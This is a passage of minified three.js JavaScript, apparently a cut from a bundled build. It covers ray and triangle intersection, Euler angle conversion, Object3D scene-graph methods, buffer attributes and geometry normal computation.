function(c){for(var d=this.planes,e=0;6>e;e++){var f=d[e];a.x=0<f.normal.x?c.min.x:c.max.x;b.x=0<f.normal.x?c.max.x:c.min.x;a.y=0<f.normal.y?c.min.y:c.max.y;b.y=0<f.normal.y?c.max.y:c.min.y;a.z=0<f.normal.z?c.min.z:c.max.z;b.z=0<f.normal.z?c.max.z:c.min.z;var g=f.distanceToPoint(a),f=f.distanceToPoint(b);if(0>\ng&&0>f)return!1}return!0}}(),containsPoint:function(a){for(var b=this.planes,c=0;6>c;c++)if(0>b[c].distanceToPoint(a))return!1;return!0}};cb.prototype={constructor:cb,set:function(a,b){this.origin.copy(a);this.direction.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.origin.copy(a.origin);this.direction.copy(a.direction);return this},at:function(a,b){return(b||new q).copy(this.direction).multiplyScalar(a).add(this.origin)},lookAt:function(a){this.direction.copy(a).sub(this.origin).normalize();\nreturn this},recast:function(){var a=new q;return function(b){this.origin.copy(this.at(b,a));return this}}(),closestPointToPoint:function(a,b){var c=b||new q;c.subVectors(a,this.origin);var d=c.dot(this.direction);return 0>d?c.copy(this.origin):c.copy(this.direction).multiplyScalar(d).add(this.origin)},distanceToPoint:function(a){return Math.sqrt(this.distanceSqToPoint(a))},distanceSqToPoint:function(){var a=new q;return function(b){var c=a.subVectors(b,this.origin).dot(this.direction);if(0>c)return this.origin.distanceToSquared(b);\na.copy(this.direction).multiplyScalar(c).add(this.origin);return a.distanceToSquared(b)}}(),distanceSqToSegment:function(){var a=new q,b=new q,c=new q;return function(d,e,f,g){a.copy(d).add(e).multiplyScalar(.5);b.copy(e).sub(d).normalize();c.copy(this.origin).sub(a);var h=.5*d.distanceTo(e),m=-this.direction.dot(b),k=c.dot(this.direction),l=-c.dot(b),p=c.lengthSq(),n=Math.abs(1-m*m),u;0<n?(d=m*l-k,e=m*k-l,u=h*n,0<=d?e>=-u?e<=u?(h=1/n,d*=h,e*=h,m=d*(d+m*e+2*k)+e*(m*d+e+2*l)+p):(e=h,d=Math.max(0,-(m*\ne+k)),m=-d*d+e*(e+2*l)+p):(e=-h,d=Math.max(0,-(m*e+k)),m=-d*d+e*(e+2*l)+p):e<=-u?(d=Math.max(0,-(-m*h+k)),e=0<d?-h:Math.min(Math.max(-h,-l),h),m=-d*d+e*(e+2*l)+p):e<=u?(d=0,e=Math.min(Math.max(-h,-l),h),m=e*(e+2*l)+p):(d=Math.max(0,-(m*h+k)),e=0<d?h:Math.min(Math.max(-h,-l),h),m=-d*d+e*(e+2*l)+p)):(e=0<m?-h:h,d=Math.max(0,-(m*e+k)),m=-d*d+e*(e+2*l)+p);f&&f.copy(this.direction).multiplyScalar(d).add(this.origin);g&&g.copy(b).multiplyScalar(e).add(a);return m}}(),intersectSphere:function(){var a=new q;\nreturn function(b,c){a.subVectors(b.center,this.origin);var d=a.dot(this.direction),e=a.dot(a)-d*d,f=b.radius*b.radius;if(e>f)return null;f=Math.sqrt(f-e);e=d-f;d+=f;return 0>e&&0>d?null:0>e?this.at(d,c):this.at(e,c)}}(),intersectsSphere:function(a){return this.distanceToPoint(a.center)<=a.radius},distanceToPlane:function(a){var b=a.normal.dot(this.direction);if(0===b)return 0===a.distanceToPoint(this.origin)?0:null;a=-(this.origin.dot(a.normal)+a.constant)/b;return 0<=a?a:null},intersectPlane:function(a,\nb){var c=this.distanceToPlane(a);return null===c?null:this.at(c,b)},intersectsPlane:function(a){var b=a.distanceToPoint(this.origin);return 0===b||0>a.normal.dot(this.direction)*b?!0:!1},intersectBox:function(a,b){var c,d,e,f,g;d=1/this.direction.x;f=1/this.direction.y;g=1/this.direction.z;var h=this.origin;0<=d?(c=(a.min.x-h.x)*d,d*=a.max.x-h.x):(c=(a.max.x-h.x)*d,d*=a.min.x-h.x);0<=f?(e=(a.min.y-h.y)*f,f*=a.max.y-h.y):(e=(a.max.y-h.y)*f,f*=a.min.y-h.y);if(c>f||e>d)return null;if(e>c||c!==c)c=e;\nif(f<d||d!==d)d=f;0<=g?(e=(a.min.z-h.z)*g,g*=a.max.z-h.z):(e=(a.max.z-h.z)*g,g*=a.min.z-h.z);if(c>g||e>d)return null;if(e>c||c!==c)c=e;if(g<d||d!==d)d=g;return 0>d?null:this.at(0<=c?c:d,b)},intersectsBox:function(){var a=new q;return function(b){return null!==this.intersectBox(b,a)}}(),intersectTriangle:function(){var a=new q,b=new q,c=new q,d=new q;return function(e,f,g,h,m){b.subVectors(f,e);c.subVectors(g,e);d.crossVectors(b,c);f=this.direction.dot(d);if(0<f){if(h)return null;h=1}else if(0>f)h=\n-1,f=-f;else return null;a.subVectors(this.origin,e);e=h*this.direction.dot(c.crossVectors(a,c));if(0>e)return null;g=h*this.direction.dot(b.cross(a));if(0>g||e+g>f)return null;e=-h*a.dot(d);return 0>e?null:this.at(e/f,m)}}(),applyMatrix4:function(a){this.direction.add(this.origin).applyMatrix4(a);this.origin.applyMatrix4(a);this.direction.sub(this.origin);this.direction.normalize();return this},equals:function(a){return a.origin.equals(this.origin)&&a.direction.equals(this.direction)}};db.RotationOrders=\n\"XYZ YZX ZXY XZY YXZ ZYX\".split(\" \");db.DefaultOrder=\"XYZ\";db.prototype={constructor:db,isEuler:!0,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get order(){return this._order},set order(a){this._order=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._order=d||this._order;this.onChangeCallback();return this},\nclone:function(){return new this.constructor(this._x,this._y,this._z,this._order)},copy:function(a){this._x=a._x;this._y=a._y;this._z=a._z;this._order=a._order;this.onChangeCallback();return this},setFromRotationMatrix:function(a,b,c){var d=N.clamp,e=a.elements;a=e[0];var f=e[4],g=e[8],h=e[1],m=e[5],k=e[9],l=e[2],p=e[6],e=e[10];b=b||this._order;\"XYZ\"===b?(this._y=Math.asin(d(g,-1,1)),.99999>Math.abs(g)?(this._x=Math.atan2(-k,e),this._z=Math.atan2(-f,a)):(this._x=Math.atan2(p,m),this._z=0)):\"YXZ\"===\nb?(this._x=Math.asin(-d(k,-1,1)),.99999>Math.abs(k)?(this._y=Math.atan2(g,e),this._z=Math.atan2(h,m)):(this._y=Math.atan2(-l,a),this._z=0)):\"ZXY\"===b?(this._x=Math.asin(d(p,-1,1)),.99999>Math.abs(p)?(this._y=Math.atan2(-l,e),this._z=Math.atan2(-f,m)):(this._y=0,this._z=Math.atan2(h,a))):\"ZYX\"===b?(this._y=Math.asin(-d(l,-1,1)),.99999>Math.abs(l)?(this._x=Math.atan2(p,e),this._z=Math.atan2(h,a)):(this._x=0,this._z=Math.atan2(-f,m))):\"YZX\"===b?(this._z=Math.asin(d(h,-1,1)),.99999>Math.abs(h)?(this._x=\nMath.atan2(-k,m),this._y=Math.atan2(-l,a)):(this._x=0,this._y=Math.atan2(g,e))):\"XZY\"===b?(this._z=Math.asin(-d(f,-1,1)),.99999>Math.abs(f)?(this._x=Math.atan2(p,m),this._y=Math.atan2(g,a)):(this._x=Math.atan2(-k,e),this._y=0)):console.warn(\"THREE.Euler: .setFromRotationMatrix() given unsupported order: \"+b);this._order=b;if(!1!==c)this.onChangeCallback();return this},setFromQuaternion:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeRotationFromQuaternion(b);return this.setFromRotationMatrix(a,\nc,d)}}(),setFromVector3:function(a,b){return this.set(a.x,a.y,a.z,b||this._order)},reorder:function(){var a=new ca;return function(b){a.setFromEuler(this);return this.setFromQuaternion(a,b)}}(),equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._order===this._order},fromArray:function(a){this._x=a[0];this._y=a[1];this._z=a[2];void 0!==a[3]&&(this._order=a[3]);this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=\nthis._y;a[b+2]=this._z;a[b+3]=this._order;return a},toVector3:function(a){return a?a.set(this._x,this._y,this._z):new q(this._x,this._y,this._z)},onChange:function(a){this.onChangeCallback=a;return this},onChangeCallback:function(){}};nd.prototype={constructor:nd,set:function(a){this.mask=1<<a},enable:function(a){this.mask|=1<<a},toggle:function(a){this.mask^=1<<a},disable:function(a){this.mask&=~(1<<a)},test:function(a){return 0!==(this.mask&a.mask)}};var Bf=0;x.DefaultUp=new q(0,1,0);x.DefaultMatrixAutoUpdate=\n!0;x.prototype={constructor:x,isObject3D:!0,applyMatrix:function(a){this.matrix.multiplyMatrices(a,this.matrix);this.matrix.decompose(this.position,this.quaternion,this.scale)},setRotationFromAxisAngle:function(a,b){this.quaternion.setFromAxisAngle(a,b)},setRotationFromEuler:function(a){this.quaternion.setFromEuler(a,!0)},setRotationFromMatrix:function(a){this.quaternion.setFromRotationMatrix(a)},setRotationFromQuaternion:function(a){this.quaternion.copy(a)},rotateOnAxis:function(){var a=new ca;return function(b,\nc){a.setFromAxisAngle(b,c);this.quaternion.multiply(a);return this}}(),rotateX:function(){var a=new q(1,0,0);return function(b){return this.rotateOnAxis(a,b)}}(),rotateY:function(){var a=new q(0,1,0);return function(b){return this.rotateOnAxis(a,b)}}(),rotateZ:function(){var a=new q(0,0,1);return function(b){return this.rotateOnAxis(a,b)}}(),translateOnAxis:function(){var a=new q;return function(b,c){a.copy(b).applyQuaternion(this.quaternion);this.position.add(a.multiplyScalar(c));return this}}(),\ntranslateX:function(){var a=new q(1,0,0);return function(b){return this.translateOnAxis(a,b)}}(),translateY:function(){var a=new q(0,1,0);return function(b){return this.translateOnAxis(a,b)}}(),translateZ:function(){var a=new q(0,0,1);return function(b){return this.translateOnAxis(a,b)}}(),localToWorld:function(a){return a.applyMatrix4(this.matrixWorld)},worldToLocal:function(){var a=new S;return function(b){return b.applyMatrix4(a.getInverse(this.matrixWorld))}}(),lookAt:function(){var a=new S;return function(b){a.lookAt(b,\nthis.position,this.up);this.quaternion.setFromRotationMatrix(a)}}(),add:function(a){if(1<arguments.length){for(var b=0;b<arguments.length;b++)this.add(arguments[b]);return this}if(a===this)return console.error(\"THREE.Object3D.add: object can't be added as a child of itself.\",a),this;a&&a.isObject3D?(null!==a.parent&&a.parent.remove(a),a.parent=this,a.dispatchEvent({type:\"added\"}),this.children.push(a)):console.error(\"THREE.Object3D.add: object not an instance of THREE.Object3D.\",a);return this},remove:function(a){if(1<\narguments.length)for(var b=0;b<arguments.length;b++)this.remove(arguments[b]);b=this.children.indexOf(a);-1!==b&&(a.parent=null,a.dispatchEvent({type:\"removed\"}),this.children.splice(b,1))},getObjectById:function(a){return this.getObjectByProperty(\"id\",a)},getObjectByName:function(a){return this.getObjectByProperty(\"name\",a)},getObjectByProperty:function(a,b){if(this[a]===b)return this;for(var c=0,d=this.children.length;c<d;c++){var e=this.children[c].getObjectByProperty(a,b);if(void 0!==e)return e}},\ngetWorldPosition:function(a){a=a||new q;this.updateMatrixWorld(!0);return a.setFromMatrixPosition(this.matrixWorld)},getWorldQuaternion:function(){var a=new q,b=new q;return function(c){c=c||new ca;this.updateMatrixWorld(!0);this.matrixWorld.decompose(a,c,b);return c}}(),getWorldRotation:function(){var a=new ca;return function(b){b=b||new db;this.getWorldQuaternion(a);return b.setFromQuaternion(a,this.rotation.order,!1)}}(),getWorldScale:function(){var a=new q,b=new ca;return function(c){c=c||new q;\nthis.updateMatrixWorld(!0);this.matrixWorld.decompose(a,b,c);return c}}(),getWorldDirection:function(){var a=new ca;return function(b){b=b||new q;this.getWorldQuaternion(a);return b.set(0,0,1).applyQuaternion(a)}}(),raycast:function(){},traverse:function(a){a(this);for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].traverse(a)},traverseVisible:function(a){if(!1!==this.visible){a(this);for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].traverseVisible(a)}},traverseAncestors:function(a){var b=this.parent;\nnull!==b&&(a(b),b.traverseAncestors(a))},updateMatrix:function(){this.matrix.compose(this.position,this.quaternion,this.scale);this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(a){!0===this.matrixAutoUpdate&&this.updateMatrix();if(!0===this.matrixWorldNeedsUpdate||!0===a)null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),this.matrixWorldNeedsUpdate=!1,a=!0;for(var b=this.children,c=0,d=b.length;c<d;c++)b[c].updateMatrixWorld(a)},\ntoJSON:function(a){function b(a){var b=[],c;for(c in a){var d=a[c];delete d.metadata;b.push(d)}return b}var c=void 0===a||\"\"===a,d={};c&&(a={geometries:{},materials:{},textures:{},images:{}},d.metadata={version:4.4,type:\"Object\",generator:\"Object3D.toJSON\"});var e={};e.uuid=this.uuid;e.type=this.type;\"\"!==this.name&&(e.name=this.name);\"{}\"!==JSON.stringify(this.userData)&&(e.userData=this.userData);!0===this.castShadow&&(e.castShadow=!0);!0===this.receiveShadow&&(e.receiveShadow=!0);!1===this.visible&&\n(e.visible=!1);e.matrix=this.matrix.toArray();void 0!==this.geometry&&(void 0===a.geometries[this.geometry.uuid]&&(a.geometries[this.geometry.uuid]=this.geometry.toJSON(a)),e.geometry=this.geometry.uuid);void 0!==this.material&&(void 0===a.materials[this.material.uuid]&&(a.materials[this.material.uuid]=this.material.toJSON(a)),e.material=this.material.uuid);if(0<this.children.length){e.children=[];for(var f=0;f<this.children.length;f++)e.children.push(this.children[f].toJSON(a).object)}if(c){var c=\nb(a.geometries),f=b(a.materials),g=b(a.textures);a=b(a.images);0<c.length&&(d.geometries=c);0<f.length&&(d.materials=f);0<g.length&&(d.textures=g);0<a.length&&(d.images=a)}d.object=e;return d},clone:function(a){return(new this.constructor).copy(this,a)},copy:function(a,b){void 0===b&&(b=!0);this.name=a.name;this.up.copy(a.up);this.position.copy(a.position);this.quaternion.copy(a.quaternion);this.scale.copy(a.scale);this.matrix.copy(a.matrix);this.matrixWorld.copy(a.matrixWorld);this.matrixAutoUpdate=\na.matrixAutoUpdate;this.matrixWorldNeedsUpdate=a.matrixWorldNeedsUpdate;this.layers.mask=a.layers.mask;this.visible=a.visible;this.castShadow=a.castShadow;this.receiveShadow=a.receiveShadow;this.frustumCulled=a.frustumCulled;this.renderOrder=a.renderOrder;this.userData=JSON.parse(JSON.stringify(a.userData));if(!0===b)for(var c=0;c<a.children.length;c++)this.add(a.children[c].clone());return this}};Object.assign(x.prototype,pa.prototype);hb.prototype={constructor:hb,set:function(a,b){this.start.copy(a);\nthis.end.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.start.copy(a.start);this.end.copy(a.end);return this},getCenter:function(a){return(a||new q).addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(a){return(a||new q).subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},at:function(a,b){var c=b||new q;return this.delta(c).multiplyScalar(a).add(this.start)},\nclosestPointToPointParameter:function(){var a=new q,b=new q;return function(c,d){a.subVectors(c,this.start);b.subVectors(this.end,this.start);var e=b.dot(b),e=b.dot(a)/e;d&&(e=N.clamp(e,0,1));return e}}(),closestPointToPoint:function(a,b,c){a=this.closestPointToPointParameter(a,b);c=c||new q;return this.delta(c).multiplyScalar(a).add(this.start)},applyMatrix4:function(a){this.start.applyMatrix4(a);this.end.applyMatrix4(a);return this},equals:function(a){return a.start.equals(this.start)&&a.end.equals(this.end)}};\nza.normal=function(){var a=new q;return function(b,c,d,e){e=e||new q;e.subVectors(d,c);a.subVectors(b,c);e.cross(a);b=e.lengthSq();return 0<b?e.multiplyScalar(1/Math.sqrt(b)):e.set(0,0,0)}}();za.barycoordFromPoint=function(){var a=new q,b=new q,c=new q;return function(d,e,f,g,h){a.subVectors(g,e);b.subVectors(f,e);c.subVectors(d,e);d=a.dot(a);e=a.dot(b);f=a.dot(c);var m=b.dot(b);g=b.dot(c);var k=d*m-e*e;h=h||new q;if(0===k)return h.set(-2,-1,-1);k=1/k;m=(m*f-e*g)*k;d=(d*g-e*f)*k;return h.set(1-m-\nd,d,m)}}();za.containsPoint=function(){var a=new q;return function(b,c,d,e){b=za.barycoordFromPoint(b,c,d,e,a);return 0<=b.x&&0<=b.y&&1>=b.x+b.y}}();za.prototype={constructor:za,set:function(a,b,c){this.a.copy(a);this.b.copy(b);this.c.copy(c);return this},setFromPointsAndIndices:function(a,b,c,d){this.a.copy(a[b]);this.b.copy(a[c]);this.c.copy(a[d]);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a.copy(a.a);this.b.copy(a.b);this.c.copy(a.c);return this},\narea:function(){var a=new q,b=new q;return function(){a.subVectors(this.c,this.b);b.subVectors(this.a,this.b);return.5*a.cross(b).length()}}(),midpoint:function(a){return(a||new q).addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},normal:function(a){return za.normal(this.a,this.b,this.c,a)},plane:function(a){return(a||new la).setFromCoplanarPoints(this.a,this.b,this.c)},barycoordFromPoint:function(a,b){return za.barycoordFromPoint(a,this.a,this.b,this.c,b)},containsPoint:function(a){return za.containsPoint(a,\nthis.a,this.b,this.c)},closestPointToPoint:function(){var a,b,c,d;return function(e,f){void 0===a&&(a=new la,b=[new hb,new hb,new hb],c=new q,d=new q);var g=f||new q,h=Infinity;a.setFromCoplanarPoints(this.a,this.b,this.c);a.projectPoint(e,c);if(!0===this.containsPoint(c))g.copy(c);else{b[0].set(this.a,this.b);b[1].set(this.b,this.c);b[2].set(this.c,this.a);for(var m=0;m<b.length;m++){b[m].closestPointToPoint(c,!0,d);var k=c.distanceToSquared(d);k<h&&(h=k,g.copy(d))}}return g}}(),equals:function(a){return a.a.equals(this.a)&&\na.b.equals(this.b)&&a.c.equals(this.c)}};ha.prototype={constructor:ha,clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a=a.a;this.b=a.b;this.c=a.c;this.normal.copy(a.normal);this.color.copy(a.color);this.materialIndex=a.materialIndex;for(var b=0,c=a.vertexNormals.length;b<c;b++)this.vertexNormals[b]=a.vertexNormals[b].clone();b=0;for(c=a.vertexColors.length;b<c;b++)this.vertexColors[b]=a.vertexColors[b].clone();return this}};Ka.prototype=Object.create(X.prototype);Ka.prototype.constructor=\nKa;Ka.prototype.isMeshBasicMaterial=!0;Ka.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;\nthis.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;return this};U.prototype={constructor:U,isBufferAttribute:!0,set needsUpdate(a){!0===a&&this.version++},setArray:function(a){if(Array.isArray(a))throw new TypeError(\"THREE.BufferAttribute: array should be a Typed Array.\");this.count=void 0!==a?a.length/this.itemSize:0;this.array=a},setDynamic:function(a){this.dynamic=a;return this},copy:function(a){this.array=\nnew a.array.constructor(a.array);this.itemSize=a.itemSize;this.count=a.count;this.normalized=a.normalized;this.dynamic=a.dynamic;return this},copyAt:function(a,b,c){a*=this.itemSize;c*=b.itemSize;for(var d=0,e=this.itemSize;d<e;d++)this.array[a+d]=b.array[c+d];return this},copyArray:function(a){this.array.set(a);return this},copyColorsArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyColorsArray(): color is undefined\",\nd),f=new J);b[c++]=f.r;b[c++]=f.g;b[c++]=f.b}return this},copyIndicesArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];b[c++]=f.a;b[c++]=f.b;b[c++]=f.c}return this},copyVector2sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector2sArray(): vector is undefined\",d),f=new D);b[c++]=f.x;b[c++]=f.y}return this},copyVector3sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=\na[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector3sArray(): vector is undefined\",d),f=new q);b[c++]=f.x;b[c++]=f.y;b[c++]=f.z}return this},copyVector4sArray:function(a){for(var b=this.array,c=0,d=0,e=a.length;d<e;d++){var f=a[d];void 0===f&&(console.warn(\"THREE.BufferAttribute.copyVector4sArray(): vector is undefined\",d),f=new fa);b[c++]=f.x;b[c++]=f.y;b[c++]=f.z;b[c++]=f.w}return this},set:function(a,b){void 0===b&&(b=0);this.array.set(a,b);return this},getX:function(a){return this.array[a*\nthis.itemSize]},setX:function(a,b){this.array[a*this.itemSize]=b;return this},getY:function(a){return this.array[a*this.itemSize+1]},setY:function(a,b){this.array[a*this.itemSize+1]=b;return this},getZ:function(a){return this.array[a*this.itemSize+2]},setZ:function(a,b){this.array[a*this.itemSize+2]=b;return this},getW:function(a){return this.array[a*this.itemSize+3]},setW:function(a,b){this.array[a*this.itemSize+3]=b;return this},setXY:function(a,b,c){a*=this.itemSize;this.array[a+0]=b;this.array[a+\n1]=c;return this},setXYZ:function(a,b,c,d){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;return this},setXYZW:function(a,b,c,d,e){a*=this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;this.array[a+3]=e;return this},onUpload:function(a){this.onUploadCallback=a;return this},clone:function(){return(new this.constructor(this.array,this.itemSize)).copy(this)}};uc.prototype=Object.create(U.prototype);uc.prototype.constructor=uc;vc.prototype=Object.create(U.prototype);\nvc.prototype.constructor=vc;wc.prototype=Object.create(U.prototype);wc.prototype.constructor=wc;xc.prototype=Object.create(U.prototype);xc.prototype.constructor=xc;ib.prototype=Object.create(U.prototype);ib.prototype.constructor=ib;yc.prototype=Object.create(U.prototype);yc.prototype.constructor=yc;jb.prototype=Object.create(U.prototype);jb.prototype.constructor=jb;z.prototype=Object.create(U.prototype);z.prototype.constructor=z;zc.prototype=Object.create(U.prototype);zc.prototype.constructor=zc;\nObject.assign(Me.prototype,{computeGroups:function(a){var b,c=[],d=void 0;a=a.faces;for(var e=0;e<a.length;e++){var f=a[e];f.materialIndex!==d&&(d=f.materialIndex,void 0!==b&&(b.count=3*e-b.start,c.push(b)),b={start:3*e,materialIndex:d})}void 0!==b&&(b.count=3*e-b.start,c.push(b));this.groups=c},fromGeometry:function(a){var b=a.faces,c=a.vertices,d=a.faceVertexUvs,e=d[0]&&0<d[0].length,f=d[1]&&0<d[1].length,g=a.morphTargets,h=g.length,m;if(0<h){m=[];for(var k=0;k<h;k++)m[k]=[];this.morphTargets.position=\nm}var l=a.morphNormals,p=l.length,n;if(0<p){n=[];for(k=0;k<p;k++)n[k]=[];this.morphTargets.normal=n}for(var u=a.skinIndices,q=a.skinWeights,r=u.length===c.length,A=q.length===c.length,k=0;k<b.length;k++){var w=b[k];this.vertices.push(c[w.a],c[w.b],c[w.c]);var y=w.vertexNormals;3===y.length?this.normals.push(y[0],y[1],y[2]):(y=w.normal,this.normals.push(y,y,y));y=w.vertexColors;3===y.length?this.colors.push(y[0],y[1],y[2]):(y=w.color,this.colors.push(y,y,y));!0===e&&(y=d[0][k],void 0!==y?this.uvs.push(y[0],\ny[1],y[2]):(console.warn(\"THREE.DirectGeometry.fromGeometry(): Undefined vertexUv \",k),this.uvs.push(new D,new D,new D)));!0===f&&(y=d[1][k],void 0!==y?this.uvs2.push(y[0],y[1],y[2]):(console.warn(\"THREE.DirectGeometry.fromGeometry(): Undefined vertexUv2 \",k),this.uvs2.push(new D,new D,new D)));for(y=0;y<h;y++){var K=g[y].vertices;m[y].push(K[w.a],K[w.b],K[w.c])}for(y=0;y<p;y++)K=l[y].vertexNormals[k],n[y].push(K.a,K.b,K.c);r&&this.skinIndices.push(u[w.a],u[w.b],u[w.c]);A&&this.skinWeights.push(q[w.a],\nq[w.b],q[w.c])}this.computeGroups(a);this.verticesNeedUpdate=a.verticesNeedUpdate;this.normalsNeedUpdate=a.normalsNeedUpdate;this.colorsNeedUpdate=a.colorsNeedUpdate;this.uvsNeedUpdate=a.uvsNeedUpdate;this.groupsNeedUpdate=a.groupsNeedUpdate;return this}});var Vd=0;T.prototype={constructor:T,isGeometry:!0,applyMatrix:function(a){for(var b=(new ya).getNormalMatrix(a),c=0,d=this.vertices.length;c<d;c++)this.vertices[c].applyMatrix4(a);c=0;for(d=this.faces.length;c<d;c++){a=this.faces[c];a.normal.applyMatrix3(b).normalize();\nfor(var e=0,f=a.vertexNormals.length;e<f;e++)a.vertexNormals[e].applyMatrix3(b).normalize()}null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();this.normalsNeedUpdate=this.verticesNeedUpdate=!0;return this},rotateX:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationX(b);this.applyMatrix(a);return this}}(),rotateY:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationY(b);this.applyMatrix(a);return this}}(),\nrotateZ:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationZ(b);this.applyMatrix(a);return this}}(),translate:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeTranslation(b,c,d);this.applyMatrix(a);return this}}(),scale:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeScale(b,c,d);this.applyMatrix(a);return this}}(),lookAt:function(){var a;return function(b){void 0===a&&(a=new x);a.lookAt(b);a.updateMatrix();this.applyMatrix(a.matrix)}}(),\nfromBufferGeometry:function(a){function b(a,b,d,e){var f=void 0!==g?[l[a].clone(),l[b].clone(),l[d].clone()]:[],u=void 0!==h?[c.colors[a].clone(),c.colors[b].clone(),c.colors[d].clone()]:[];e=new ha(a,b,d,f,u,e);c.faces.push(e);void 0!==m&&c.faceVertexUvs[0].push([p[a].clone(),p[b].clone(),p[d].clone()]);void 0!==k&&c.faceVertexUvs[1].push([n[a].clone(),n[b].clone(),n[d].clone()])}var c=this,d=null!==a.index?a.index.array:void 0,e=a.attributes,f=e.position.array,g=void 0!==e.normal?e.normal.array:\nvoid 0,h=void 0!==e.color?e.color.array:void 0,m=void 0!==e.uv?e.uv.array:void 0,k=void 0!==e.uv2?e.uv2.array:void 0;void 0!==k&&(this.faceVertexUvs[1]=[]);for(var l=[],p=[],n=[],u=e=0;e<f.length;e+=3,u+=2)c.vertices.push(new q(f[e],f[e+1],f[e+2])),void 0!==g&&l.push(new q(g[e],g[e+1],g[e+2])),void 0!==h&&c.colors.push(new J(h[e],h[e+1],h[e+2])),void 0!==m&&p.push(new D(m[u],m[u+1])),void 0!==k&&n.push(new D(k[u],k[u+1]));if(void 0!==d)if(f=a.groups,0<f.length)for(e=0;e<f.length;e++)for(var G=f[e],\nr=G.start,A=G.count,u=r,r=r+A;u<r;u+=3)b(d[u],d[u+1],d[u+2],G.materialIndex);else for(e=0;e<d.length;e+=3)b(d[e],d[e+1],d[e+2]);else for(e=0;e<f.length/3;e+=3)b(e,e+1,e+2);this.computeFaceNormals();null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());null!==a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());return this},center:function(){this.computeBoundingBox();var a=this.boundingBox.getCenter().negate();this.translate(a.x,a.y,a.z);return a},normalize:function(){this.computeBoundingSphere();\nvar a=this.boundingSphere.center,b=this.boundingSphere.radius,b=0===b?1:1/b,c=new S;c.set(b,0,0,-b*a.x,0,b,0,-b*a.y,0,0,b,-b*a.z,0,0,0,1);this.applyMatrix(c);return this},computeFaceNormals:function(){for(var a=new q,b=new q,c=0,d=this.faces.length;c<d;c++){var e=this.faces[c],f=this.vertices[e.a],g=this.vertices[e.b];a.subVectors(this.vertices[e.c],g);b.subVectors(f,g);a.cross(b);a.normalize();e.normal.copy(a)}},computeVertexNormals:function(a){void 0===a&&(a=!0);var b,c,d;d=Array(this.vertices.length);\nb=0;for(c=this.vertices.length;b<c;b++)d[b]=new q;if(a){var e,f,g,h=new q,m=new q;a=0;for(b=this.faces.length;a<b;a++)c=this.faces[a],e=this.vertices[c.a],f=this.vertices[c.b],g=this.vertices[c.c],h.subVectors(g,f),m.subVectors(e,f),h.cross(m),d[c.a].add(h),d[c.b].add(h),d[c.c].add(h)}else for(this.computeFaceNormals(),a=0,b=this.faces.length;a<b;a++)c=this.faces[a],d[c.a].add(c.normal),d[c.b].add(c.normal),d[c.c].add(c.normal);b=0;for(c=this.vertices.length;b<c;b++)d[b].normalize();a=0;for(b=this.faces.length;a<\nb;a++)c=this.faces[a],e=c.vertexNormals,3===e.length?(e[0].copy(d[c.a]),e[1].copy(d[c.b]),e[2].copy(d[c.c])):(e[0]=d[c.a].clone(),e[1]=d[c.b].clone(),e[2]=d[c.c].clone());0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeFlatVertexNormals:function(){var a,b,c;this.computeFaceNormals();a=0;for(b=this.faces.length;a<b;a++){c=this.faces[a];var d=c.vertexNormals;3===d.length?(d[0].copy(c.normal),d[1].copy(c.normal),d[2].copy(c.normal)):(d[0]=c.normal.clone(),d[1]=c.normal.clone(),d[2]=c.normal.clone())}0<\nthis.faces.length&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){var 